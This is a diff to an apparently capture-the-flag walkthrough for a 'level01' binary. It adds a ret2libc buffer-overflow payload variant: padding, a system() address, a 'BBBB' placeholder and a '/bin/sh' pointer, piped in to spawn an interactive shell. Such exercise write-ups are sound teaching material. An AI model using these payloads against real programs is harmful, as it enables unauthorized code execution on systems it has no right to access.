@@ -168,6 +168,14 @@ the spawned shell stays interactive.
 (python -c 'print "dat_wil\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'; cat -) | ./level01
 ```
 
+Without `exit` you must still keep a 4-byte placeholder in `system`'s return slot (here
+`BBBB`) — deleting it would shift `"/bin/sh"` out of the argument position. This variant opens
+the shell just as well; it only segfaults *after* you leave the shell:
+
+```bash
+(python -c 'print "dat_wil\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "BBBB" + "\xec\x97\xf8\xf7"'; cat -) | ./level01
+```
+
 🟨 **In the shell:**
 
 ```bash
